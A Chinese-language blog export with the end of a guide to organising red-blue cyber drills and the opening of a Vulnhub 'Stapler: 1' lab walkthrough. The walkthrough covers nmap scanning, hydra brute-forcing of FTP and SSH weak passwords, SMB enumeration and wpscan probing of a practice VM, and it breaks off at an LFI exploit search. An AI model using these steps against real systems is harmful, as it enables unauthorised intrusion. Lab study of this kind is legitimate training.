<td>防守组监测攻击</td>
<td>蓝队可利用安全设备监测网络攻击，分析确认所发现的攻击行为，记录详细监测数据</td>
</tr>
<tr>
<td>提交成果</td>
<td>红队将所发现的安全漏洞、所获取的权限和成果截图保存，并通过平台提交</td>
</tr>
<tr>
<td>漏洞确认及研判</td>
<td>由专家组确认所提交漏洞的真实性，并根据评分规则判定相应分数</td>
</tr>
<tr>
<td>攻击结束</td>
<td>在演习规定时间外，攻击组停止对目标系统的攻击</td>
</tr>
<tr>
<td>成果总结</td>
<td>演习工作组协调各参演小组，将演习中产生的成果、问题、数据汇总，最终输出演习总结报告</td>
</tr>
<tr>
<td>资源回收</td>
<td>演习工作组负责回收处理各类设备、网络资源，演习相关数据，并监督攻击组清除在演习过程中使用的木马、脚本等数据</td>
</tr>
<tr>
<td>演习结束</td>
<td>对所有目标系统攻击结束后，各工作小组还需进行内部总结汇报，演习结束</td>
</tr>
</tbody></table>
<p>Step 5：<strong>搭建演习平台</strong></p>
<table>
<thead>
<tr>
<th>平台</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>攻击场地</td>
<td>攻击组的演习阵地，可分为场内攻击与场外攻击，搭建专用的网络环境，配以充足的攻击资源，并通过演习监控系统，确保攻击行为安全可控</td>
</tr>
<tr>
<td>防守场地</td>
<td>防守组的演习阵地，通过视频监控系统，将防守场地实时战况回传指挥中心</td>
</tr>
<tr>
<td>目标信息系统</td>
<td>防守组的网络资产系统，将围绕该系统开展相应的防御工作</td>
</tr>
<tr>
<td>行为分析中心</td>
<td>通过网络安全审计设备，收集并分析攻击行为，实时监控攻击过程，建立完整的攻击场景，最终通过可视化大屏实时展现</td>
</tr>
<tr>
<td>指挥大厅</td>
<td>攻防双方的实时状态将接入到指挥大厅监控大屏，领导可以随时指导视察</td>
</tr>
</tbody></table>
<p>Step 6：<strong>应急保障措施</strong></p>
<ul>
<li>当演习中出现不可控突发事件（如断电，断网，业务停顿等），导致演习中断或终止时，指挥部需要采取相应的应急保障措施。</li>
<li>在演习实施方案时，指挥部应组织攻防双方制定演习应急响应预案的具体措施。</li>
</ul>
<h3 id="第二阶段：前期准备"><a href="#第二阶段：前期准备" class="headerlink" title="第二阶段：前期准备"></a>第二阶段：前期准备</h3><p>Step 1：<strong>资源准备</strong></p>
<table>
<thead>
<tr>
<th>备项</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>演习场地布置</td>
<td>演习场地划分、展示大屏、办公桌椅、专用网络搭建等</td>
</tr>
<tr>
<td>演习平台搭建</td>
<td>攻防平台开通、攻防双方账户开通、IP 地址分配等，确保平台正常运行</td>
</tr>
<tr>
<td>演习人员专用电脑</td>
<td>配备专用电脑，需安装有安全监控软件、防病毒软件、录屏软件等，确保事件回溯机制生效</td>
</tr>
<tr>
<td>视频监控部署</td>
<td>部署攻防演习场地的视频监控系统，确保物理环境安全</td>
</tr>
<tr>
<td>演习备案</td>
<td>组织单位向上级主管单位及监管机构（公安、网信等）进行演习备案</td>
</tr>
<tr>
<td>演习授权</td>
<td>组织单位向红队进行正式授权，确保演习工作在授权范围内有序进行</td>
</tr>
<tr>
<td>保密协议</td>
<td>与参演第三方人员签署相关保密协议，确保信息安全</td>
</tr>
<tr>
<td>攻击规则制定</td>
<td>规定红队的接入方式、攻击时间、攻击范围、需报备的特定攻击事件等，明确禁止使用的攻击行为（导致业务瘫痪、信息篡改、信息泄露、潜伏控制等）</td>
</tr>
<tr>
<td>评分规则制定</td>
<td>红队评分规则：针对目标系统、集权类系统、账户信息、重要关键信息系统等的加减分项<br/>蓝队评分规则：针对发现类、消除类、应急处置类、追踪溯源类、演习总结类等的加减分项</td>
</tr>
</tbody></table>
<p>Step 2：<strong>人员准备</strong></p>
<table>
<thead>
<tr>
<th>角色</th>
<th>职责</th>
</tr>
</thead>
<tbody><tr>
<td>攻击方（红队）</td>
<td>确定攻击队数量，每队参与人员数量建议 3 至 5 人<br/>审核红队人员技术能力、背景等<br/>要求红队人员签署保密协议<br/>确定红队负责人并构建攻击方组织架构<br/>向红队人员宣贯攻击规则及演习相关要求</td>
</tr>
<tr>
<td>防守方（蓝队）</td>
<td>确定防守队成员信息，由本单位或第三方安全技术人员组成<br/>审核蓝队人员技术能力、背景等<br/>要求第三方蓝队人员签署保密协议<br/>确定蓝队负责人并构建防守方组织架构<br/>向蓝队人员宣贯防守规则及演习相关要求</td>
</tr>
</tbody></table>
<h3 id="第三阶段：实战攻防演习"><a href="#第三阶段：实战攻防演习" class="headerlink" title="第三阶段：实战攻防演习"></a>第三阶段：实战攻防演习</h3><p>Step 1：<strong>演习启动</strong></p>
<ul>
<li>组织演习相关单位召开启动会议，部署实战攻防演习工作，向攻防双方明确工作要求，制定约束措施，确定应急预案，规定演习时间，宣布演习正式开始。</li>
<li>启动会议内容包括相关领导发言，宣布演习规则、演习时间、纪律要求，核实攻防双方人员信息，攻击方抽签分组等。</li>
</ul>
<p>Step 2：<strong>演习过程</strong></p>
<table>
<thead>
<tr>
<th>过程</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>演习监控</td>
<td>将攻防双方的实时状态与比分状况传至指挥调度大屏<br/>全程监控目标系统的运行状态、红队的操作行为和攻击成果、蓝队的攻击发现和响应处置等</td>
</tr>
<tr>
<td>演习研判</td>
<td>对攻防双方的过程与成果进行研判评分，从而得出最终排名<br/>红队评分机制：对目标系统攻击的实际危害程度、准确性、时间长短、漏洞贡献数量等<br/>蓝队评分机制：发现攻击行为、响应流程、防御手段、防守时间等</td>
</tr>
<tr>
<td>演习处置</td>
<td>当演习中出现突发事件，蓝队无法有效应对时，由紫队提供应急处置人员，对事件快速定位、分析、恢复，以保障演习系统正常运行</td>
</tr>
<tr>
<td>演习保障</td>
<td>人员安全保障：每天核实攻防双方人员信息，避免擅自替换人员，保障演习公平公正<br/>攻击过程监控：全程监控红队操作行为、网络全流量、物理环境等，并总结输出日报备查<br/>专家研判：确认攻击成果、确认防守成果、判定违规行为等<br/>攻击过程回溯：核实红队的攻击成果与攻击流量，发现违规行为及时处理<br/>信息通告：利用信息交互工具建立指挥群，统一发布和收集信息，确保信息快速同步<br/>人员保障：指派专人现场监督，建立应急与医务团队处置突发事件<br/>资源保障：每天对设备、系统、网络例行检查，确保资源的可用性<br/>后勤保障：演习期间合理安排餐食，演习现场储备足够的水和食物<br/>突发事件应急处置：确定紧急联系人列表，事件上报指挥部，执行应急预案</td>
</tr>
</tbody></table>
<h3 id="第四阶段：演习总结"><a href="#第四阶段：演习总结" class="headerlink" title="第四阶段：演习总结"></a>第四阶段：演习总结</h3><p>Step 1：<strong>演习恢复</strong></p>
<table>
<thead>
<tr>
<th>流程</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>收集报告</td>
<td>收集并汇总攻防双方所提交的总结报告</td>
</tr>
<tr>
<td>清除后门</td>
<td>依据攻击方报告和监控到的攻击流量，确保完全清除攻击方上传的后门</td>
</tr>
<tr>
<td>账号及权限回收</td>
<td>攻击方提交报告后，回收其所有账号及权限，包括在目标系统上新建的账号</td>
</tr>
<tr>
<td>攻击方电脑回收</td>
<td>回收并格式化攻击方电脑，并清除所有数据</td>
</tr>
<tr>
<td>网络访问权限回收</td>
<td>回收攻击方的所有网络访问权限</td>
</tr>
</tbody></table>
<p>Step 2：<strong>演习总结</strong></p>
<table>
<thead>
<tr>
<th>要点</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>成果确认</td>
<td>确认被攻陷目标的归属单位或部门，落实攻击成果</td>
</tr>
<tr>
<td>数据统计</td>
<td>汇总攻防双方的演习成果，统计攻防数据，进行评分与排名</td>
</tr>
<tr>
<td>总结会议</td>
<td>参演单位进行总结汇报，组织单位对演习进行总体评价<br/>对成绩优异的参演队伍颁发奖杯和证书<br/>攻防双方互相分享经验心得<br/>针对演习中存在的问题，提出改进建议与整改计划</td>
</tr>
<tr>
<td>视频汇报与宣传</td>
<td>制作本次演习的纪实视频，以供防守方在内部播放宣传，提高人员安全意识</td>
</tr>
</tbody></table>
<p>Step 3：<strong>整改建议</strong></p>
<ul>
<li>演习结束后，组织单位应组织专业技术人员，汇总、复盘、分析所有攻击数据，并总结经验教训，对现存问题提出合理整改建议。</li>
<li>向防守单位下发详细过程分析报告，并督促整改，要求在限期内上报整改结果。</li>
</ul>
<h2 id="3-3-风险规避措施"><a href="#3-3-风险规避措施" class="headerlink" title="3.3 风险规避措施"></a>3.3 风险规避措施</h2><h3 id="演习限定攻击目标系统，不限定攻击路径"><a href="#演习限定攻击目标系统，不限定攻击路径" class="headerlink" title="演习限定攻击目标系统，不限定攻击路径"></a>演习限定攻击目标系统，不限定攻击路径</h3><ul>
<li>针对特定的目标系统，不限定攻击方采用的攻击路径，但在攻击路径中发现的安全漏洞和隐患，应及时向演习指挥部报备，不允许对其进行破坏性操作，避免影响业务系统正常运行。</li>
</ul>
<h3 id="除授权外，演习不允许使用拒绝服务攻击"><a href="#除授权外，演习不允许使用拒绝服务攻击" class="headerlink" title="除授权外，演习不允许使用拒绝服务攻击"></a>除授权外，演习不允许使用拒绝服务攻击</h3><ul>
<li>除非经演习主办方授权，否则攻击方禁止使用 SYN Flood、CC 等拒绝服务攻击手段。</li>
</ul>
<h3 id="网页篡改攻击方式的说明"><a href="#网页篡改攻击方式的说明" class="headerlink" title="网页篡改攻击方式的说明"></a>网页篡改攻击方式的说明</h3><ul>
<li>演习只针对互联网系统或应用的一级或二级页面进行篡改，以检验防守方的应急响应和侦查调查能力。</li>
<li>攻击方对目标系统成功渗透并获取网站控制权限后，需先请示演习指挥部，同意后再将其下发的特定图片张贴在指定网页。</li>
</ul>
<h3 id="演习禁止采用的攻击方式"><a href="#演习禁止采用的攻击方式" class="headerlink" title="演习禁止采用的攻击方式"></a>演习禁止采用的攻击方式</h3><ul>
<li>禁止通过收买防守方人员进行攻击。</li>
<li>禁止通过物理入侵、截断监听外部光纤等方式进行攻击。</li>
<li>禁止采用无线电干扰机等直接影响目标系统运行的攻击方式。</li>
</ul>
<h3 id="攻击方木马使用要求"><a href="#攻击方木马使用要求" class="headerlink" title="攻击方木马使用要求"></a>攻击方木马使用要求</h3><ul>
<li>木马控制端由演习指挥部统一提供使用。</li>
<li>木马不应具有自动删除目标系统文件、损坏引导扇区、主动扩散、感染文件、造成服务器宕机等破坏性功能。</li>
<li>禁止使用具有破坏性和感染性的病毒、蠕虫等。</li>
</ul>
<h3 id="非法攻击阻断及通报"><a href="#非法攻击阻断及通报" class="headerlink" title="非法攻击阻断及通报"></a>非法攻击阻断及通报</h3><ul>
<li>演习指挥部应组织技术支持小组，记录与分析攻击网络的全流量。</li>
<li>当发现不合规攻击行为时，应及时阻断非法攻击行为，并对相应攻击队伍进行通报批评。</li>
</ul>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>自 2016 年首次开展网络实战攻防演习以来，这种全新的网络安全检验模式得到了广泛认可与飞跃性发展。</p>
<p>针对国家关键基础设施开展实战攻防工作，使得关键信息系统的整体安全性有了显著提高和可靠保障；针对企业重要信息系统、敏感系统、工控系统等进行实战攻防演习，大幅提升了各级单位应对网络安全突发事件的处理能力，以及相关网络与系统的防御能力。</p>
<p>本文旨在「实战攻防三部曲」原有的章节结构下，归纳总结关键要点作为学习指导手册，并精炼了部分语句的表达，修订了个别笔误或表意不明之处。因笔者水平有限，若本文总结存在不足或错误，还望不吝指教。最后向奇安信集团所提供的实战攻防经验总结致以诚挚的感谢。</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Red-Blue</category>
      </categories>
      <tags>
        <tag>Guideline</tag>
        <tag>Attack</tag>
        <tag>Defense</tag>
        <tag>Drill</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】 Stapler：1</title>
    <url>/2021/08/29/vulnhub-stapler-1/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题的综合渗透靶机镜像来自 <a href="https://www.vulnhub.com/">Vulnhub</a> 的 <a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a>，最终目标是获取靶机 root 权限并打印 flag。</p>
<p>靶机主要涉及<strong>服务匿名访问、用户弱口令、错误配置、敏感信息泄露、文件上传、本地提权</strong>等漏洞，提供了较为综合的渗透测试练习环境，能从中学习到常见的渗透技巧及漏洞利用方法，为初学者拓宽了渗透实战的新思路。</p>
<p>根据提示，至少有两条通路能<strong>获取 shell 环境</strong>，并至少有三种提权方法<strong>得到 root 权限</strong>。</p>
<ul>
<li>题目链接：<a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/description.png" alt="description"></p>
<p>本文操作环境为 Windows 10 操作系统与 VMware Workstation 15 Pro 虚拟机，其中虚拟机需导入 Kali Linux 2020.4 系统作为攻击机，及 Stapler 的 Ubuntu 16.04 系统作为靶机。</p>
<p><em><strong>申明：本文仅用于安全技术学习，切勿用于非法用途，否则后果自负。</strong></em></p>
<h1 id="0x01-靶机发现"><a href="#0x01-靶机发现" class="headerlink" title="0x01 靶机发现"></a>0x01 靶机发现</h1><p>首先，下载靶机镜像压缩包，解压后通过打开 ovf 文件将 vmdk 镜像导入 VMware，等待其初始化完成，出现系统登录界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/stapler-login.png" alt="stapler-login"></p>
<p>注意到，靶机默认网络连接模式为<strong>仅主机模式</strong>，为保证后续扫描顺利进行，需调整为 <strong>NAT 模式</strong>。</p>
<blockquote>
<p>小贴士：靶机调整网络连接模式后，需重启生效。</p>
</blockquote>
<p>接着，打开 Kali 攻击机，将其网络连接模式与靶机保持一致。通过 <code>ifconfig eth0</code> 命令，可知<strong>攻击机 IP 地址为 192.168.153.148</strong>，再通过 <code>nmap -n -sn 192.168.153.0/24</code> 命令，得知<strong>靶机 IP 地址为 192.168.153.147</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/target-discovery.png" alt="target-discovery"></p>
<p>值得一提的是，在 NAT 模式下，192.168.153.1 为宿主机 IP，192.168.153.2 为 NAT 设备 IP，192.168.153.254 为 DHCP 服务器 IP，具体请参考：</p>
<blockquote>
<p><a href="https://www.vmware.com/support/ws55/doc/ws_net_advanced_ipaddress.html">Selecting IP Addresses on a Host-only Network or NAT Configuration</a></p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/address-in-nat.png" alt="address-in-nat"></p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>首先，对靶机一无所知的情况下，应使用 nmap 工具，探测其所有开放端口及对应服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sT -sV -O -p- 192.168.153.147</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nmap-scan-port.png" alt="nmap-scan-port"></p>
<p>发现靶机上开启了 FTP、SSH、DNS、HTTP、Samba、MySQL 等服务，下面将进一步收集各服务的有效信息。</p>
<h2 id="端口-21：FTP-服务"><a href="#端口-21：FTP-服务" class="headerlink" title="端口 21：FTP 服务"></a>端口 21：FTP 服务</h2><p>继续使用 nmap 工具，添加 <code>-A</code> 参数对端口 21 进行深入扫描，发现 FTP 服务存在<strong>匿名访问漏洞</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sT -sV -O -A -p21 192.168.153.147</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nmap-scan-port-21.png" alt="nmap-scan-port-21"></p>
<p>使用 anonymous 用户名与任意口令登录后，发现一条给 <strong>Harry</strong> 的提示信息，并且在当前根目录下存在 <strong>note 文件</strong>，下载至本地后打印，发现是一条 <strong>John</strong> 给 <strong>Elly</strong> 的留言：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ftp-anonymous-login.png" alt="ftp-anonymous-login"></p>
<p>尝试使用上述信息出现的人名，作为 FTP 服务的用户名，再通过 hydra 工具检测是否存在空口令、同名口令、同名逆向口令等。结果显示，<strong>elly 用户名存在同名逆向口令 ylle</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L ftp_user_name -e nsr ftp://192.168.153.147</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/hydra-ftp.png" alt="hydra-ftp"></p>
<p>再使用 elly 用户名与 ylle 口令登录，发现当前根目录为挂载于 &#x2F;etc&#x2F; 下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ftp-elly-login.png" alt="ftp-elly-login"></p>
<p>下载系统用户配置文件 passwd 并打印，发现许多自定义的个人用户：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/get-passwd.png" alt="get-passwd"></p>
<p>将其中具有可登录 shell 的用户筛选出来，存至 ssh_user_name：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> passwd | grep -v -E <span class="string">&quot;nologin|false&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f 1 &gt; ssh_user_name</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/extract-login-users.png" alt="extract-login-users"></p>
<h2 id="端口-22：SSH-服务"><a href="#端口-22：SSH-服务" class="headerlink" title="端口 22：SSH 服务"></a>端口 22：SSH 服务</h2><p>将上述 ssh_user_name 作为 SSH 服务的用户名列表，同样使用 hydra 工具检测是否存在空口令、同名口令、同名逆向口令等。结果显示，<strong>SHayslett 用户名存在同名口令 SHayslett</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L ssh_user_name -e nsr ssh://192.168.153.147</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/hydra-ssh.png" alt="hydra-ssh"></p>
<p>使用 SHayslett 用户名与 SHayslett 口令登录成功，并发现一条给 <strong>Barry</strong> 的提示信息。</p>
<h2 id="端口-139：SMB-服务"><a href="#端口-139：SMB-服务" class="headerlink" title="端口 139：SMB 服务"></a>端口 139：SMB 服务</h2><p>使用 enum4linux 工具探测 SMB 服务，添加 <code>-a</code> 参数进行全面探测，并将结果存至 smb_result：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.153.147 | <span class="built_in">tee</span> smb_result</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/enum4linux-all.png" alt="enum4linux-all"></p>
<p>在用户信息扫描结果中，发现目标主机的用户列表：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/enum4linux-users.png" alt="enum4linux-users"></p>
<p>若使用该列表中的用户名，对 FTP 与 SSH 服务进行爆破，同样能得到 elly 与 SHayslett 用户的弱口令，此处不再赘述。</p>
<p>接着，在共享服务扫描结果中，发现有效<strong>共享服务名 tmp 与 kathy</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/enum4linux-shares.png" alt="enum4linux-shares"></p>
<p>使用 smbclient 工具连接 SMB 服务，其中 <code>-N</code> 参数指定空口令登录，<strong>双斜杠后指定服务器地址，单斜杠后指定共享服务名</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -N //192.168.153.147/tmp</span><br></pre></td></tr></table></figure>

<p>在共享服务 tmp 下，只发现一个 ls 文件，下载至本地并打印，像是 root 用户某目录下的文件列举信息，其中还包含一个时间同步服务的相关文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/smbclient-tmp.png" alt="smbclient-tmp"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -N //192.168.153.147/kathy</span><br></pre></td></tr></table></figure>

<p>在共享服务 kathy 下，发现 kathy_stuff 与 backup 两个目录，其中包含了 todo-list.txt、vsftpd.conf、wordpress-4.tar.gz 三个文件，分别下载至本地后，均未搜出可利用的敏感信息：</p>
<p>todo-list.txt 包含一条给 kathy 留言，确保帮 Initech 备份了重要数据。</p>
<p>vsftpd.conf 为本地 FTP 服务配置文件，与 &#x2F;etc&#x2F;vsftpd.conf 内容相同。</p>
<p>wordpress-4.tar.gz 为 4.2.1 版本的 WordPress 服务原始代码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/smbclient-kathy.png" alt="smbclient-kathy"></p>
<h2 id="端口-666：未知服务"><a href="#端口-666：未知服务" class="headerlink" title="端口 666：未知服务"></a>端口 666：未知服务</h2><p>针对未知服务的端口，可使用 nc 工具进行探测。结果显示为一堆乱码，但其中清晰可见 <strong>message2.jpg 字符串</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.153.147 666</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nc-detect.png" alt="nc-detect"></p>
<p>将数据流重定向至本地文件 file_port_666，并使用 file 工具查看，结果显示为 <strong>Zip 压缩包</strong>。</p>
<p>继续使用 unzip 工具解压，得到 message2.jpg 图像文件，打开后发现一条给 <strong>Scott</strong> 的留言：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nc-download.png" alt="nc-download"></p>
<h2 id="端口-80：PHP-CLI-服务"><a href="#端口-80：PHP-CLI-服务" class="headerlink" title="端口 80：PHP CLI 服务"></a>端口 80：PHP CLI 服务</h2><p>在浏览器使用 HTTP 协议访问 80 端口，提示在网站根目录下找不到主页：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/http-80.png" alt="http-80"></p>
<p>针对一般的 Web 服务，可先用 nikto 漏洞扫描工具进行初步探测。结果显示，根目录下存在 .bashrc 与 .profile 文件，说明根目录可能位于某个用户的主目录下：</p>
<p>遗憾的是，将上述文件下载至本地后，并未发现敏感信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto --host http://192.168.153.147/</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nikto-http-80.png" alt="nikto-http-80"></p>
<h2 id="端口-12380：WordPress-服务"><a href="#端口-12380：WordPress-服务" class="headerlink" title="端口 12380：WordPress 服务"></a>端口 12380：WordPress 服务</h2><p>在浏览器使用 HTTP 协议访问 12380 端口，弹出页面提示 <code>Coming Soon</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/http-12380.png" alt="http-12380"></p>
<p>查看网页源码，在底部注释中，发现一条 HR 部门给 <strong>Zoe</strong> 的留言：</p>
<p>值得注意的是，在 &#x2F;etc&#x2F;passwd 系统文件与 SMB 服务探测结果中，同样存在 zoe 用户。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/http-12380-source.png" alt="http-12380-source"></p>
<p>先使用 nikto 漏洞扫描工具进行初步探测。结果显示，站点还<strong>支持 HTTPS 协议</strong>访问，并存在 <strong>&#x2F;admin112233&#x2F;、&#x2F;blogblog&#x2F;、&#x2F;phpmyadmin&#x2F;</strong> 等三个目录，存在 <strong>&#x2F;robots.txt、&#x2F;icons&#x2F;README</strong> 等两个文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto --host http://192.168.153.147:12380/</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nikto-http-12380.png" alt="nikto-http-12380"></p>
<p>在浏览器使用 HTTPS 协议访问 12380 端口，弹出页面提示 <code>Internal Index Page</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380.png" alt="https-12380"></p>
<p>访问 &#x2F;robots.txt 文件，发现 Disallow 的目录为 &#x2F;admin112233&#x2F; 与 &#x2F;blogblog&#x2F;，与扫描结果一致：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-robots.png" alt="https-12380-robots"></p>
<p>访问 &#x2F;icons&#x2F;README 文件，发现只是 Apache 图标目录下的默认文档，并无敏感信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-icons-readme.png" alt="https-12380-icons-readme"></p>
<p>访问 &#x2F;admin112233&#x2F; 目录后，弹框提示 <code>This could of been a BeEF-XSS hook ;)</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-admin112233.png" alt="https-12380-admin112233"></p>
<p>看样子是出题人挖了个坑等着我们跳，算是个小彩蛋吧。查看网页源码可发现，最终会被重定向至 <a href="http://www.xss-payloads.com/">http://www.xss-payloads.com</a> 站点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-admin112233-source.png" alt="https-12380-admin112233-source"></p>
<p>访问 &#x2F;blogblog&#x2F; 目录后，发现是个名为 <strong>INITECH</strong> 的博客网页（曾在 todo-list.txt 中出现过，推断 INITECH 可能为公司名）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog.png" alt="https-12380-blogblog"></p>
<p>查看网页源码可发现，博客站点通过 4.2.1 版本的 WordPress 搭建（其原始代码 wordpress-4.tar.gz 曾备份于 kathy 共享目录下）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-source.png" alt="https-12380-blogblog-source"></p>
<p>访问 &#x2F;phpmyadmin&#x2F; 目录后，弹出 phpMyAdmin 登录页面（需使用有效 MySQL 用户名口令登录）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-phpmyadmin.png" alt="phpmyadmin"></p>
<p>接下来，使用 wpscan 工具进行针对性扫描。在这之前，先要配置 API Token。</p>
<p>在 <a href="https://wpscan.com/">WPScan</a> 官网注册登录后，进入 Profile 页面获取 API Token，每天有 25 次免费调用机会：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wpscan-api-token.png" alt="wpscan-api-token"></p>
<p>并在 Kali Linux 当前 root 用户的主目录下，创建 ~&#x2F;.wpscan&#x2F;scan.yml 配置文件，写入以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cli_options:</span></span><br><span class="line">  <span class="attr">api_token:</span> <span class="string">YOUR_API_TOKEN</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wpscan-scan-yml.png" alt="wpscan-scan-yml"></p>
<p>首先探测网站的有效用户名，添加 <code>--enumerate u1-100</code> 参数指定前 100 个用户名（实际上没这么多），并添加 <code>--disable-tls-checks</code> 参数忽略 TLS 检查。结果显示，共有 17 个用户名，大部分与之前收集的相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url https://192.168.153.147:12380/blogblog/ --enumerate u1-100 --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wpscan-enumerate-u.png" alt="wpscan-enumerate-u"></p>
<p>再探测网站使用的所有插件，添加 <code>--enumerate ap</code> 参数指定扫描所有插件，并添加 <code>--plugins-detection aggressive</code> 参数指定主动扫描模式。结果显示，共有 4 个插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url https://192.168.153.147:12380/blogblog/ --enumerate ap --plugins-detection aggressive --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wpscan-enumerate-ap.png" alt="wpscan-enumerate-ap"></p>
<h1 id="0x03-Web-渗透"><a href="#0x03-Web-渗透" class="headerlink" title="0x03 Web 渗透"></a>0x03 Web 渗透</h1><h2 id="Advanced-Video-插件-LFI-漏洞利用"><a href="#Advanced-Video-插件-LFI-漏洞利用" class="headerlink" title="Advanced Video 插件 LFI 漏洞利用"></a>Advanced Video 插件 LFI 漏洞利用</h2><p>针对 WordPress 插件，可使用 searchsploit 工具搜索相关漏洞利用脚本。通过搜索插件名，发现 <strong>Advanced Video 插件存在 <a href="https://www.exploit-db.com/exploits/39646">LFI 本地文件包含漏洞（EDB-ID 39646）</a></strong> ，并将其 EXP 脚本复制到当前目录：</p>
